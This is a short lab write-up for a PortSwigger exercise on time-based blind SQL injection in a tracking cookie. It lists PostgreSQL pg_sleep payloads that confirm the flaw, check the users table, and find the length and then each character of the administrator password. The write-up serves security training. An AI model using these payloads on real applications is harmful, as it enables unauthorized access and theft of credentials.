# Lab #13 - Blind SQL Injection with time delays
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

Vulnerable parameter - tracking cookie

**End Goal:**
- Exploit time-based blind SQLi to output the administrator password
- Login as the administrator user

**Analysis:**

1) Confirm that the parameter is vulnerable to SQLi
```SQL 
' || pg_sleep(10)--
```
2) Confirm that the users table exists in the database
True usecase
```SQL 
' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
```
False usecase
```SQL 
' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--
```
```SQL 
' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
```
-> True

3) Enumerate the password length


```SQL 
' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
```
-> length of password is 20 characters

4) Enumerate the administrator password
```SQL 
' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
```
